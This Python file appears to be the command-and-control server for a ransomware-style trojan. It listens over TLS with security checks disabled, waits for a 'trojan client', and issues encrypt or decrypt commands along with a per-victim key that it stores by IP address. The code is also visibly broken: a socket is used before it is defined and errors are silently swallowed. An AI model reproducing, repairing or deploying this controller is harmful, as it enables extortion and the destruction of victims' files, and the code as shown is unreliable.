import socket
import ssl
import random
import string
import time
import os

COMMANDS = ('enc' , 'dec')

victim_ip = "0.0.0.0"
port= 8889
certfile = 'Certificate/server.crt'
keyfile = 'Certificate/server.key'
LENGTH =32



def send_secret(client_socket, command, ip):

    secret = None
    if(os.path.isfile("secret/new_secret.txt")):#checks if theres already a secret file
        data =  open(r"secret/new_secret.txt", "r")
        data =data.read()
        print(data , type(data))

        if data:
            if(type(data) == str):
                if ip in data:
                    secret = data.split(ip)[1].split('secret: ')[1][0:32].strip()#retrieive saved secret for exclusive ip
                    print(secret)



    if not secret:#if secret does not exists
        secret = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=LENGTH))#create new one
    try:
        file = open(r"secret/new_secret.txt", "x")#create a file for saving secret
        file.write("ip:{} secret: {} ".format(ip, secret) + "\n")
    except:
        file = open(r"secret/new_secret.txt", "w")#writes in existing file for saving secret
        file.write("ip:{} secret: {} ".format(ip, secret) + "\n")
    file.close()

    client_socket.send(secret.encode())# send client command and secret
    client_socket.send(command.encode())
    time.sleep(5)


def main():
    try:

        context = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS_SERVER, certfile=certfile, keyfile=keyfile)
        context.check_hostname = False
        context.set_ciphers("ALL:@SECLEVEL=0")

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((victim_ip, port))
        server_socket.listen()

        while True:#ready to connect to any trojan client
            try:
                connection, addr = ssl_socket.accept()
                ssl_socket = context.wrap_socket(connection, server_side=True) #wrapping socket in ssl
                print('connected')
                command = ''
                while(command not in COMMANDS):
                    command = input("what would you like to do? (enc \ dec)").strip()#takes command from user

                if(command in COMMANDS):#if command is known
                    send_secret(connection , command , addr[0])
                server_socket.close()
                connection.close()
            except:
                pass
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()